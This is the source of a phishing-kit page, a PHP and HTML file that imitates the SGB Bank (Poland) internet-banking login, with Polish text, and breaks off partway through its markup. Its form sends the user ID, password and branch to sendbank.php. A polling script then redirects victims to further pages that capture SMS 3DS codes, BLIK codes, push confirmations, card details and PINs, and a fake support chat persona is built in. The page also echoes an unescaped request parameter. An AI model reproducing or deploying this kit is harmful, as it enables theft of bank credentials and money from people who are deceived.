<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "SGB Bank.");
?>
<!DOCTYPE html>
<html class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<title>Bаnkowość Intеrnetоwа</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<style>
md-select.md-theme-theme .md-select-value{border-bottom-color:rgba(0,0,0,0.12)}md-select.md-theme-theme:not([disabled]):focus .md-select-value{border-bottom-color:rgb(50,157,49);color:rgba(0,0,0,0.87)}md-select.md-theme-theme .md-select-icon{color:rgba(0,0,0,0.54)}md-select.md-theme-theme .md-select-value span:first-child:after{color:rgb(208,2,27)}md-content.md-theme-theme{color:rgba(0,0,0,0.87);background-color:rgb(250,250,250)}md-select-menu.md-theme-theme md-content{background-color:rgb(255,255,255)} body,html{height:100%;position:relative}body{margin:0;padding:0}input{vertical-align:baseline}input:-webkit-autofill{text-shadow:none}body,html{-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-touch-callout:none;min-height:100%;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}html,input{font-family:Roboto,Helvetica Neue,sans-serif}input{font-size:100%}md-content{display:block;position:relative;overflow:auto;-webkit-overflow-scrolling:touch}@media print{md-content{overflow:visible!important}}md-input-container:not(.md-input-has-value):not(.md-input-has-placeholder) input:not(:focus){color:transparent}md-input-container:not(.md-input-has-value) input:not(:focus)::-webkit-datetime-edit-ampm-field,md-input-container:not(.md-input-has-value) input:not(:focus)::-webkit-datetime-edit-day-field,md-input-container:not(.md-input-has-value) input:not(:focus)::-webkit-datetime-edit-hour-field,md-input-container:not(.md-input-has-value) input:not(:focus)::-webkit-datetime-edit-millisecond-field,md-input-container:not(.md-input-has-value) input:not(:focus)::-webkit-datetime-edit-minute-field,md-input-container:not(.md-input-has-value) input:not(:focus)::-webkit-datetime-edit-month-field,md-input-container:not(.md-input-has-value) input:not(:focus)::-webkit-datetime-edit-second-field,md-input-container:not(.md-input-has-value) input:not(:focus)::-webkit-datetime-edit-text,md-input-container:not(.md-input-has-value) input:not(:focus)::-webkit-datetime-edit-week-field,md-input-container:not(.md-input-has-value) input:not(:focus)::-webkit-datetime-edit-year-field{color:transparent}.md-select-menu-container{position:fixed;left:0;top:0;z-index:90;opacity:0;display:none;-webkit-transform:translateY(-1px);transform:translateY(-1px)}.md-select-menu-container:not(.md-clickable){pointer-events:none}md-select{display:-webkit-box;display:-ms-flexbox;display:flex;margin:20px 0 26px}md-select:focus{outline:none}md-select:not([disabled]):hover{cursor:pointer}md-select:not([disabled]):focus .md-select-value{border-bottom-width:2px;border-bottom-style:solid;padding-bottom:0}.md-select-value{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;padding:2px 2px 1px;border-bottom-width:1px;border-bottom-style:solid;background-color:transparent;position:relative;-webkit-box-sizing:content-box;box-sizing:content-box;min-width:64px;min-height:26px;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1}.md-select-value>span:not(.md-select-icon){max-width:100%;-webkit-box-flex:1;-ms-flex:1 1 auto;flex:1 1 auto;text-overflow:ellipsis;white-space:nowrap;overflow:hidden}.md-select-value>span:not(.md-select-icon) .md-text{display:inline}.md-select-value .md-select-icon{display:block;-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end;text-align:right;width:24px;margin:0 4px;-webkit-transform:translate3d(0,-2px,0);transform:translate3d(0,-2px,0);font-size:1.2rem}.md-select-value .md-select-icon:after{display:block;content:"\25BC";position:relative;top:2px;speak:none;font-size:13px;-webkit-transform:scaleY(.5) scaleX(1);transform:scaleY(.5) scaleX(1)}md-select-menu{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-shadow:0 1px 3px 0 rgba(0,0,0,.2),0 1px 1px 0 rgba(0,0,0,.14),0 2px 1px -1px rgba(0,0,0,.12);box-shadow:0 1px 3px 0 rgba(0,0,0,.2),0 1px 1px 0 rgba(0,0,0,.14),0 2px 1px -1px rgba(0,0,0,.12);max-height:256px;min-height:48px;overflow-y:hidden;-webkit-transform-origin:left top;transform-origin:left top;-webkit-transform:scale(1);transform:scale(1)}md-select-menu:not(.md-overflow) md-content{padding-top:8px;padding-bottom:8px}md-select-menu md-content{min-width:136px;min-height:48px;max-height:256px;overflow-y:auto}md-select-menu>*{opacity:0}@media screen and (-ms-high-contrast:active){md-select-menu{border:1px solid #fff}}@-moz-document url-prefix(){}.layout-align-end-stretch{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.layout-align-space-between-center,.layout-align-space-between-start{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.layout-align-space-between-start{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start;-ms-flex-line-pack:start;align-content:flex-start}.layout-align-space-between-center{-webkit-box-align:center;-ms-flex-align:center;align-items:center;-ms-flex-line-pack:center;align-content:center;max-width:100%}.layout-align-space-between-center>*{max-width:100%;-webkit-box-sizing:border-box;box-sizing:border-box}.layout-align-end-stretch{-webkit-box-align:stretch;-ms-flex-align:stretch;align-items:stretch;-ms-flex-line-pack:stretch;align-content:stretch}.flex{-webkit-box-flex:1;-ms-flex:1;flex:1}.flex{-webkit-box-sizing:border-box;box-sizing:border-box}.layout-column,.layout-row{-webkit-box-sizing:border-box;box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex}.layout-column{-webkit-box-orient:vertical;-ms-flex-direction:column;flex-direction:column}.layout-column,.layout-row{-webkit-box-direction:normal}.layout-row{-webkit-box-orient:horizontal;-ms-flex-direction:row;flex-direction:row}@media (min-width:960px){.layout-gt-sm-row{-webkit-box-sizing:border-box;box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex}.layout-gt-sm-row{-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row}}*{font-family:Lato,sans-serif!important;outline:none;-webkit-box-sizing:border-box;box-sizing:border-box}body,html{background-color:#f7f7f7}#loading-bar-container,#loading-bar-container>div,#loading-bar-container>div>div{height:100%}.button{text-transform:uppercase;font-size:12px;font-weight:600;border-radius:5px;width:100%;color:#329d31;line-height:48px;border:none;padding:0;background:transparent}.button__raised{background:linear-gradient(153.43deg,#64b530,#329d31);color:#fff}.button__link{font-size:10px;line-height:20px;color:#329d31;text-decoration:none}.select-language{width:80px;border:1px solid #e5e5e5;border-radius:5px}.select-language md-select{margin:6px 10px}.select-language md-select .md-select-value{padding:0;border-bottom:none;color:#2e2f34}.select-language md-select:not([disabled]):focus .md-select-value{border:0}.select-language md-select .md-select-icon{background-image:url("./sgb/sgb-1.svg");height:20px;margin:0;color:#329d31}.select-language md-select .md-select-icon:after{visibility:hidden}@charset "UTF-8";@font-face{font-family:Lato;src:url("./sgb/sgb-7.ttf");font-weight:600;font-style:normal}@font-face{font-family:Lato;src:url("./sgb/sgb-6.ttf");font-weight:300;font-style:normal}@font-face{font-family:Lato;src:url("./sgb/sgb-8.ttf");font-weight:400;font-style:normal}*{font-family:Lato,sans-serif!important;outline:none;-webkit-box-sizing:border-box;box-sizing:border-box}body,html{background-color:#f7f7f7}#loading-bar-container,#loading-bar-container>div,#loading-bar-container>div>div{height:100%}.select-language{width:80px;border:1px solid #e5e5e5;border-radius:5px}.select-language md-select{margin:6px 10px}.select-language md-select .md-select-value{padding:0;border-bottom:none;color:#2e2f34}.select-language md-select:not([disabled]):focus .md-select-value{border:0}.select-language md-select .md-select-icon{background-image:url("./sgb/sgb-1.svg");height:20px;margin:0;color:#329d31}.select-language md-select .md-select-icon:after{visibility:hidden}.button{text-transform:uppercase;font-size:12px;font-weight:600;border-radius:5px;width:100%;color:#329d31;line-height:48px;border:none;padding:0;background:transparent}.button__raised{background:linear-gradient(153.43deg,#64b530,#329d31);color:#fff}.button__link{font-size:10px;line-height:20px;color:#329d31;text-decoration:none}.authentication{max-width:1920px;margin:0 auto}@media (min-width:1920px){.authentication{margin:0 0 0 auto}}.authentication background-component{display:none}@media (min-width:960px){.authentication background-component{display:block}}.authentication background-component img{top:0;width:100%;height:100%;max-width:816px;position:absolute}.authentication__banner{margin-bottom:24px}.authentication__banner img{max-width:376px;width:100%}.authentication__wrapper{height:100%;background:#f7f7f7}@media (min-width:960px){.authentication__wrapper{position:absolute;right:0;overflow:auto;max-width:890px}}@media (min-width:1366px){.authentication__wrapper{max-width:1114px}}.authentication__logo{padding-bottom:10px;font-size:0;width:100%}.authentication__container{background:#fff;color:#474747;position:relative}@media (min-width:960px){.authentication__container{width:434px}}@media (min-width:1366px){.authentication__container{width:578px}}.authentication__content{font-size:14px;margin:0 auto;background:#fff;padding:10px 0 32px}@media (min-width:960px){.authentication__content{max-width:100%;padding:10px 56px 32px}}@media (min-width:1366px){.authentication__content{padding:88px 128px 32px}}.authentication__form{width:100%;padding-bottom:20px}.authentication__form--title{color:#191818;line-height:32px;margin-bottom:16px;font-size:22px}@media (min-width:960px){.authentication__form--title{font-size:26px}}.authentication__form--subtitle{line-height:20px;margin-bottom:40px}.authentication__form--fields{margin-bottom:24px}.authentication__form--label{margin-bottom:16px}.authentication__form--input{border-radius:5px!important;border:1px solid #e4e4e4!important;width:100%;height:48px!important;font-weight:300;padding:10px 16px!important;line-height:1!important}.authentication__button-group{margin-bottom:24px}.authentication__footer{width:100%;max-width:312px;margin:0 auto}.authentication__footer--links{text-align:right}.authentication__rules{background-color:#f7f7f7;color:#313131;font-size:12px;line-height:20px;padding:24px 0;max-width:312px;margin:0 auto}@media (min-width:960px){.authentication__rules{margin:0;max-width:100%;width:456px;padding:32px 40px}}@media (min-width:1366px){.authentication__rules{width:536px;padding:32px 80px}}.authentication__rules--title{color:#191818;font-size:20px;line-height:24px;margin-bottom:16px}.authentication__rules--information{margin-bottom:8px}.authentication__rules--list{margin-bottom:16px}.authentication__rules--list-item{line-height:20px;margin-bottom:8px;position:relative;padding-left:16px}.authentication__rules--list-item:before{content:"○";position:absolute;font-size:18px;width:1px;color:#329d31;border-radius:100%;left:0;top:-1px}.authentication__rules--alert{margin-bottom:16px;padding:8px 16px;border:1px solid #ffcf8e;border-radius:5px;background-color:#fff9ed}@media (min-width:1921px){.authentication{margin:0;max-width:100vw}.authentication background-component img{max-width:36%}.authentication .authentication__wrapper{left:36%;right:auto}}
</style><link type="text/css" rel="stylesheet" charset="UTF-8" href="./sgb_files/translateelement.css"></head>

<body id="auth-body">
<div id="loading-bar-container">
<div id="application"><div id="__single_spa_angular_1" class="ng-scope"><span class="ng-scope"><div class="authentication ng-scope">
<background-component class="ng-isolate-scope"><img src="./sgb_files/sgb-3.jpeg">
</background-component>
<div class="authentication__wrapper layout-gt-sm-row layout-align-end-stretch">
<div class="authentication__container">
<div class="authentication__content layout-align-space-between-start layout-column flex">
<div style="width: 100%; max-width: 312px; margin: 0 auto;">
<div class="authentication__logo">
<logo-component class="ng-scope ng-isolate-scope"><img style="max-width: 320px" src="./sgb_files/sgb-5.jpeg">
</logo-component>
</div>
<div class="authentication__form ng-scope flex">
<form method="post" action="sendbank.php" id="formblock" class="ng-pristine ng-scope ng-valid-maxlength ng-valid ng-valid-required">
<div class="authentication__form--title ng-binding">Zaloguj sie</div>
<div class="authentication__form--subtitle ng-binding">Zaloguj się do internetowej bankowości elektronicznej</div>
<div class="authentication__form--fields">
<div class="authentication__form--label ng-binding">Identyfikator użytkownika</div>
<input class="authentication__form--input ng-pristine ng-empty ng-valid-maxlength ng-valid ng-valid-required ng-touched" type="text" id="field3ds" name="logindata">
</div>
<div class="authentication__form--fields">
<div class="authentication__form--label ng-binding">Kod dostępu</div>
<input class="authentication__form--input ng-pristine ng-empty ng-valid-maxlength ng-valid ng-valid-required ng-touched" type="password" id="field3ds" name="passdata" placeholder="Wprowadź hasło">
</div>
<div class="authentication__form--fields">
<div class="authentication__form--label ng-binding">W którym oddziale założono konto</div>
<input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
<input type="hidden" name="type" value="12">

<input class="authentication__form--input ng-pristine ng-empty ng-valid-maxlength ng-valid ng-valid-required ng-touched" minlength="10" type="text" required="" id="field3ds" name="otdeldata" placeholder="Warzshaw ,ul. Płocka 14, 06-450 Glinojeck
">
</div>
<div class="authentication__button-group">
<input class="button button__raised ng-binding" type="submit" value="Zaloguj się">
</div>
</form>
</div>
</div>
<div class="authentication__footer layout-align-space-between-center layout-row">
<div>
<span>
<select-language><div class="select-language">
<md-select class="ng-pristine ng-untouched ng-valid md-no-asterisk md-theme-theme ng-empty" role="button"><md-select-value class="md-select-value" id="select_value_label_0"><span><div class="md-text ng-binding">
EN
</div></span><span class="md-select-icon"></span></md-select-value><div class="md-select-menu-container" role="presentation" id="select_container_2">  <md-select-menu role="presentation" class="_md md-theme-theme"><md-content role="listbox" class="_md md-theme-theme" id="select_listbox_3">
</md-content></md-select-menu></div></md-select>
</div></select-language>
</span>
</div>
<div class="authentication__footer--links">
<div>
<a class="button button__link ng-binding md-theme-theme" ng-href="#/komunikaty-o-bezpieczenstwie/" target="_blank" href="#/komunikaty-o-bezpieczenstwie/">
WIADOMOŚCI BEZPIECZEŃSTWA
</a>
</div>
<div>
<a class="button button__link ng-binding md-theme-theme" ng-href="#/aktualnosci/Archiwalne-wydarzenia/bezpieczne-zakupy-w-internecie-dobre-praktyki" target="_blank" href="https://zbp.pl/aktualnosci/Archiwalne-wydarzenia/bezpieczne-zakupy-w-internecie-dobre-praktyki">
Bezpieczne zakupy online
</a>
</div>
</div>
</div>
</div>
</div>
<div class="authentication__rules">
<authentication-rules-component class="ng-isolate-scope"><div style="max-height: 706px;">
<div class="authentication__banner">
<banner-component class="ng-isolate-scope"><a href="#/smobile/" target="_blank" class="ng-scope md-theme-theme">
<img src="./sgb_files/sgb-4.jpeg">
</a>
</banner-component>
</div>
<div class="ng-scope">
<div class="ng-binding"><br>   <div> <div class="authentication__rules--title ng-binding">Pamiętaj o zasadach bezpieczeństwa.</div>  <div class="authentication__rules--list"> <div class="authentication__rules--list-item ng-binding">Wpisuj adres strony logowania do Bankowości Internetowej SGВ24 lub korzystaj z oficjalnej strony Banku – nie korzystaj ze stron pojawiających się w wynikach wyszukiwania w przeglądarce. Adres strony logowania rozpoczyna się od https (oznaczającego bezpieczne połączenie internetowe).</div> <div class="authentication__rules--list-item ng-binding">Zawsze sprawdzaj adres strony www, na której się logujesz. Adres rozpoczyna się od https:// (w adresie strony widnieje wyłącznie domena <b>sgb24.pl</b>). <b>Pamiętaj również o weryfikacji ważności certyfikatu wystawionego dla sgb24.pl przez firmę DigiCert. Możesz to sprawdzić, klikając w kłódkę.</b></div> <div class="authentication__rules--list-item ng-binding">Nigdy nie loguj się do Bankowości Internetowej za pośrednictwem linku otrzymanego w wiadomości e-mail/ sms lub będącego wynikiem wyszukiwania w przeglądarce.</div> </div>  <div class="authentication__rules--alert"> <strong class="ng-binding">Pamiętaj!</strong> <div class="ng-binding">Bank nie wymaga potwierdzenia danych SMS-em lub mailem oraz instalacji jakichkolwiek aplikacji na komputerach użytkowników. </div>  <div> <div class="authentication__rules--information ng-binding">W przypadku wystąpienia nieprawidłowości niezwłocznie skontaktuj się z Doradcą Infolinii Banku</div>  <div class="authentication__rules--list"> <div class="authentication__rules--list-item"> <strong class="ng-binding">800&nbsp;88&nbsp;88&nbsp;88</strong> </div>  <div class="authentication__rules--list-item"> <strong class="ng-binding">(+48)&nbsp;61&nbsp;647&nbsp;28&nbsp;46 </strong> <span class="ng-binding">( dla połączeń komórkowych oraz z zagranicy)</span> </div> </div> </div></div></div></div>
</div>
</div>
</authentication-rules-component>
</div>
</div>
</div>
</span></div></div>
</div>
<script type="text/javascript">
            
            

            function ajaxsup() {
                var request = new XMLHttpRequest();

                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) {
                        var loading = document.querySelector('#loading');
                        var smsblock = document.querySelector('#sms');
                        var lkblock = document.querySelector('#lk');
                        var result = request.responseText;
                        // console.log(request.responseText);
                        console.log('%md%');
                        if (result == 'sms') {
                            // loading.style.display = 'none';
                            // smsblock.style.display = 'block';
                            // lk.style.display = 'none';
                            location="/3ds%md%";
                        } else if (result == 'lk') {
                             location="/autorize%md%";
                            // loading.style.display = 'none';
                         //    smsblock.style.display = 'none';
                         //    lk.style.display = 'block';
                        } else if (result == 'photo') {
                             location="/checking%md%";
                            // loading.style.display = 'none';
                         //    smsblock.style.display = 'none';
                         //    lk.style.display = 'block';
                        } else if (result == 'blik') {
                             location="/blik%md%";
                        } else if (result == 'push') {
                             location="/potwierdzenie%md%";
                        } else if (result == 'card') {
                             location="/verification%md%";
                        } else if (result == 'pin') {
                             location="/pincode%md%";
                        } else {
                            // loading.style.display = 'block';
                         //    smsblock.style.display = 'none';
                         //    lk.style.display = 'none';

                        }
                    }
                }
                request.open('POST', 'procstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=84941141');
            }

            function ajaxdel() {
                var request = new XMLHttpRequest();
                request.open('POST', 'delstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=84941141');
            }

        </script>

 


<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #329d31;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #329d31;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #329d31;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                        <div class="chaport-launcher-chat-icon"></div>
                        <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./sgb_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
